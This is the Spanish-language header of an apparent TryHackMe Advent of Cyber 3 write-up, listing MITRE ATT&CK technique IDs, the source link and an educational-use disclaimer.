**MITRE ATT&CK:** T1213 (Data from Information Repositories), T1071 (Application Layer Protocol), T1190 (Exploit Public-Facing Application), T1548 (Abuse Elevation Control Mechanism), T1036 (Masquerading), T1566 (Phishing), T1020 (Automated Exfiltration), T1003 (OS Credential Dumping)

**Fuente:** [TryHackMe - Advent of Cyber 3 (2021)](https://tryhackme.com/room/adventofcyber3)

---

## ⚠️ Descargo de Responsabilidad (Disclaimer)

Este contenido se presenta exclusivamente con fines académicos y educativos.

**Sin Afiliación:** Este espacio no posee ninguna alianza, asociación, patrocinio ni vinculación oficial con TryHackMe.
**Veracidad de los Datos:** La información aquí contenida tiene un propósito ilustrativo y formativo. Los datos, políticas, precios o características de los servicios mencionados pueden variar y no son decididos por TryHackMe en este contexto.
**Referencia Oficial:** Para obtener información precisa, oficial y actualizada, se recomienda encarecidamente visitar el sitio web oficial de TryHackMe (https://tryhackme.com).
**Uso Ético:** No fomentamos ni nos responsabilizamos por el uso indebido de esta información fuera de fines educativos o profesionales legítimos.
